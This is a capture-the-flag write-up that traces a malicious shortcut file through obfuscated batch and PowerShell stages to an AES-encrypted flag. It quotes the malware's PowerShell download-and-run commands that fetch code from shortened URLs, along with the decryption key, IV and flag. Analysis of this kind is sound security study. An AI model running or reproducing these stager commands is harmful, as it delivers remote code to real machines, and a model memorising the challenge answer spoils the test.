# Russian Roulette

## Solver : `Noderyos`

After extracting it, I used [LNK Parse](https://sourceforge.net/projects/jafat/files/lnk-parse/lnk-parse-1.0/) to extract the command runned `powershell -e aQB3AHIAIABpAHMALgBnAGQALwB6AGQANABoAFoAbgAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=` after converting it from base 64, it get `iwr is.gd/zd4hZn -o $env:TMP/.cmd;& $env:TMP/.cmd`

I saved the file to `stage0.bat` as it is batch file.

Using cat, i got valid code, but if I open it in my text editor, i got some random data.

The file tricks my editor with some bytes at start, I choped it off with `dd if=stage0.bat bs=1 skip=3 of=stage0-cleaned.bat`.

I then cleaned up the code by removing comments with some regex `^::.*\n`.

Then I manualy interpreted the code to replace some variables.

After, I runned `clean-1.py` to replace modulus by its value then `clean-2.py` that is a ultra minimalist batch interpreter to detect var because simply replacing doesnt work (`%fr%a%uw%` fr and uw are variables, by replace think that a is also a variable ....) to replace variables by its ASCII value (remove the stupid cmd tricks).

I removed comments again with this regex `^(::|rem).*\n`.

We can now see some random variables definitions, that are useless and a powershell command (`powershell -e aQB3AHIAIABpAHMALgBnAGQALwBRAFIARAB5AGkAUAB8AGkAZQB4AA==`).

By decoding from base64, we get `iwr is.gd/QRDyiP|iex`, I saved the url content to `stage1.ps1`, after reformating i saved the C# code to `stage2.cs`, this code is deciphering AES so I replicated on [Cyberchef](https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)AES_Decrypt(%7B'option':'Base64','string':'/a1Y%2Bfspq/NwlcPwpaT3irY2hcEytktuH7LsY%2BNlLew%3D'%7D,%7B'option':'Base64','string':'9sXGmK4q9LdYFdOp4TSsQw%3D%3D'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=Uk5vOFRaNTZSditFeVpXNzNOb2NGT0lpTkZmTDQ1dFh3MjRVb2dHZEhrc3dlYS9XaG5OaENOd2pRbjFhV2pmdw)

## Flag : `flag{4e4f266d44717ff3af8bd92d292b79ec}`
